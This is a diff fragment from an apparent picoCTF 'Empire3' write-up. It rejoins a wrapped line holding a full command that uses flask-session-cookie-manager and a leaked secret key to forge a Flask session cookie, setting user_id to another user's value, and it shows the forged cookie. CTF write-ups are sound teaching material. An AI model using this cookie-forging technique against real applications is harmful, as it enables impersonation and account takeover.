@@ -119,8 +119,7 @@ root@kali:/media/sf_CTFs/pico/Empire3# python3 ~/utils/flask-session-cookie-mana
 Edit the cookie and set `user_id` to `2` instead of `3`:
 
 ```console
-root@kali:/media/sf_CTFs/pico/Empire3# python3 ~/utils/flask-session-cookie-manager/flask_session_cookie_manager3.py encode -s '9806d62bb5f4986c09a3872abf448e85' -t "{'_fresh': True, '_id': '94ff9a36e557d7a4
-c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba', 'csrf_token': '77acb69638d3e173bcceb720c3573ecb9cee2825', 'user_id': '2'}"
+root@kali:/media/sf_CTFs/pico/Empire3# python3 ~/utils/flask-session-cookie-manager/flask_session_cookie_manager3.py encode -s '9806d62bb5f4986c09a3872abf448e85' -t "{'_fresh': True, '_id': '94ff9a36e557d7a4c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba', 'csrf_token': '77acb69638d3e173bcceb720c3573ecb9cee2825', 'user_id': '2'}"
 .eJwlz0lqAzEQQNG7aO2FVKpB5cs0qomEQALd9irk7jbkAB_e_21HnXl9tPvjfOatHZ_R7k2xSvfkJJKQjS4ZoezsWKqr906dpKNZWdqiDbxVxXIoxBBGsLX68KmRRbPDGIQzlmzRWsqIUgqUGxWdyTGAwFGMeRTabrfm11nH4-crv98eke3GynPFzCHT3NMEuk-SmW7qmbCA3t3zyvN_AtrfC2c5PpU.XaX3qA.ORVdqh-0iJQkIjXNcElr5vSPjZY
 ```
 
